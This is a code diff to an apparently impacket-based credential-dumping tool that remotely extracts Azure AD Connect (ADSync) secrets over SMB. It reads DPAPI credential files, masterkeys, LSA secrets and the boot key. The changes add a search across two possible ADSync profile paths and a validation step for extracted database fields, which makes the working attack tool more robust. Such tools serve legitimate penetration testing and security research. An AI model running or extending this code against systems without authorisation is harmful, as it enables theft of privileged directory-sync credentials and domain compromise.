@@ -9,6 +9,7 @@ from binascii import unhexlify
 from impacket import version
 from impacket.uuid import string_to_bin, bin_to_string
 from impacket.examples import logger
+from impacket import smb3structs
 from impacket.smbconnection import SMBConnection, SessionError
 from impacket.dcerpc.v5 import transport, rrp, scmr, wkst, samr, epm, drsuapi
 from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, OfflineRegistry, RemoteFile
@@ -80,8 +81,8 @@ class ADSRemoteOperations(RemoteOperations):
         finally:
             self.__restore_adsync()
 
-    def gatherCredentialFiles(self):
-        items = self.__smbConnection.listPath('C$', r'Users\ADSync\AppData\Local\Microsoft\Credentials\\*')
+    def gatherCredentialFiles(self, basepath):
+        items = self.__smbConnection.listPath('C$', r'{0}\AppData\Local\Microsoft\Credentials\\*'.format(basepath))
         outvaults = []
         for item in items:
             if item.get_longname() == '.' or item.get_longname() == '..':
@@ -89,10 +90,35 @@ class ADSRemoteOperations(RemoteOperations):
             outvaults.append(item.get_longname())
         return outvaults
 
-    def processCredentialFile(self, file, userkey):
+    def findBasePath(self):
+        basepaths = [
+            r'Users\ADSync',
+            r'Windows\ServiceProfiles\ADSync',
+        ]
+        outbasepath = None
+        for basepath in basepaths:
+            try:
+                # Query folder
+                items = self.__smbConnection.listPath('C$', r'{0}\AppData\*'.format(basepath))
+                # If folder exists, break
+                outbasepath = basepath
+                break
+            except SessionError as err:
+                if 'STATUS_OBJECT_PATH_NOT_FOUND' in str(err):
+                    items = None
+                    # Try a different basepath
+                    continue
+        if items is None:
+            logging.error('Could not find the ADSync profile directory')
+            return
+
+        return outbasepath
+
+    def processCredentialFile(self, file, userkey, basepath):
         tsid = None
+
         logging.info('Querying credential file %s', file)
-        remoteFileName = RemoteFileRO(self.__smbConnection, r'Users\ADSync\AppData\Local\Microsoft\Credentials\{0}'.format(file), tree="C$")
+        remoteFileName = RemoteFileRO(self.__smbConnection, r'{1}\AppData\Local\Microsoft\Credentials\{0}'.format(file, basepath), tree="C$")
         try:
             remoteFileName.open()
             data = remoteFileName.read(8000)
@@ -103,18 +129,20 @@ class ADSRemoteOperations(RemoteOperations):
         finally:
             remoteFileName.close()
         gmk = bin_to_string(blob['GuidMasterKey'])
+
+        items = self.__smbConnection.listPath('C$', r'%s\AppData\Roaming\Microsoft\Protect\*' % basepath)
+
+        for item in items:
+            if item.get_longname().startswith('S-1-5-80'):
+                tsid = item.get_longname()
+                logging.info(r'Found SID %s for NT SERVICE\ADSync Virtual Account', tsid)
+
         if tsid is None:
-            # Search for SID
-            items = self.__smbConnection.listPath('C$', r'Users\ADSync\AppData\Roaming\Microsoft\Protect\*')
-            for item in items:
-                if item.get_longname().startswith('S-1-5-80'):
-                    tsid = item.get_longname()
-                    logging.info(r'Found SID %s for NT SERVICE\ADSync Virtual Account', tsid)
-            if tsid is None:
-                logging.error('Could not determine SID for ADSync user - cannot continue searching for masterkeys')
-                return
+            logging.error('Could not determine SID for ADSync user - cannot continue searching for masterkeys')
+            return
+
         key1, key2 = deriveKeysFromUserkey(tsid, userkey)
-        remoteFileName = RemoteFileRO(self.__smbConnection, r'Users\ADSync\AppData\Roaming\Microsoft\Protect\{0}\{1}'.format(tsid, gmk), tree="C$")
+        remoteFileName = RemoteFileRO(self.__smbConnection, r'{2}\AppData\Roaming\Microsoft\Protect\{0}\{1}'.format(tsid, gmk, basepath), tree="C$")
         try:
             remoteFileName.open()
             data = remoteFileName.read(8000)
@@ -221,6 +249,12 @@ class ADSRemoteOperations(RemoteOperations):
                 out['entropy'] = entropy
         if self.__options.from_file:
             infile.close()
+        # Check if all values are in the outdata
+        required = ['cryptedrecords', 'xmldata', 'instance', 'keyset_id', 'entropy']
+        for option in required:
+            if not option in out:
+                logging.error('Missing data from database. Option %s could not be extracted. Check your database or output file.', option)
+                return None
         return out
 
 
@@ -330,7 +364,10 @@ class DumpSecrets:
             self.__lmhash, self.__nthash = options.hashes.split(':')
 
     def connect(self):
+        # Debugging only
+        # self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost, preferredDialect=smb3structs.SMB2_DIALECT_21)
         self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
+
         if self.__doKerberos:
             self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                                self.__nthash, self.__aesKey, self.__kdcHost)
@@ -391,6 +428,9 @@ class DumpSecrets:
                 self.__remoteOps  = ADSRemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost, self.__options)
                 self.fetchMdb()
                 mdbdata = self.getMdbData()
+                if mdbdata is None:
+                    logging.error('Could not extract required database information. Exiting')
+                    return
                 logging.info('Querying LSA secrets from remote registry')
                 self.__remoteOps.enableRegistry()
                 bootKey = self.__remoteOps.getBootKey()
@@ -429,9 +469,10 @@ class DumpSecrets:
             if not self.__options.legacy:
                 # New format stores in in the credential store
                 logging.info('New format keyset detected, extracting secrets from credential store')
-                files = self.__remoteOps.gatherCredentialFiles()
+                basepath = self.__remoteOps.findBasePath()
+                files = self.__remoteOps.gatherCredentialFiles(basepath)
                 for credfile in files:
-                    result = self.__remoteOps.processCredentialFile(credfile, self.dpapiSystem['UserKey'])
+                    result = self.__remoteOps.processCredentialFile(credfile, self.dpapiSystem['UserKey'], basepath)
                     if result is not None:
                         if result['keyset_id'] != mdbdata['keyset_id'] or result['instanceid'] != mdbdata['instance']:
                             logging.warning('Found keyset %s instance %s, but need keyset %s instance %s. Trying next',
